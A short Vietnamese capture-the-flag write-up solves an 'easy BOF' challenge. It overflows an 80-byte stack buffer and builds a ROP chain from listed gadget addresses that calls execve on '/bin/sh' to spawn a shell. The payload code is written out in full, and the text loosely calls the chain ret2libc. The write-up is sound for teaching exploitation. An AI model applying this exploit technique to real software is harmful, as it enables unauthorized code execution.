# easy BOF

Kiểm tra các chế độ bảo vệ của chương trình:

![image](https://user-images.githubusercontent.com/93699926/236652979-b3a1716b-1f8f-43d1-b484-2eb0fc2561fe.png)

Kiểm ta chương trình ta thấy chương trình có lỗi BOF như sau :

![image](https://user-images.githubusercontent.com/93699926/236653021-841bca52-1ffd-4b89-936e-350e84ff176e.png)

Chương trình sẽ đọc 0x100 bytes vô biến v2 được khai báo có 80bytes. Vậy đây rõ ràng là lôi BOF .vVì PIE tắt nên ta sẽ có exe base. giờ đi kiếm gadget trong file exe:
`ropper --f chall`.Hơn nữa khi kiểm tra thì trong file exe có sẵn '/bin/sh' nên ta sẽ sử dụng luôn..padding tới địa chỉ saved rbp, ghi đè rbp với một đại chỉ hợp lệ , rồi tạo ROPCHAIN để ret2libc.

```python3 
pop_rax=0x0000000000401085
pop_rsi=0x0000000000401081
pop_rdi=0x000000000040107f
pop_rdx=0x0000000000401083
syscall=0x000000000040100a
offset=0x58
binsh=0x402010
```

Vậy payload của ta như sau :

```python3
payload=b"A"*0x50+p64(0x00000000402a00)
payload+=flat(
        pop_rax,0x3b,
        pop_rdi,binsh,
        pop_rdx,0,
        pop_rsi,0,
        syscall
        )
```

full script in p.py

Chạy chương trình ta có flag:

![image](https://user-images.githubusercontent.com/93699926/236653146-98c74fd9-76b5-40f7-ab77-20374a02a3aa.png)
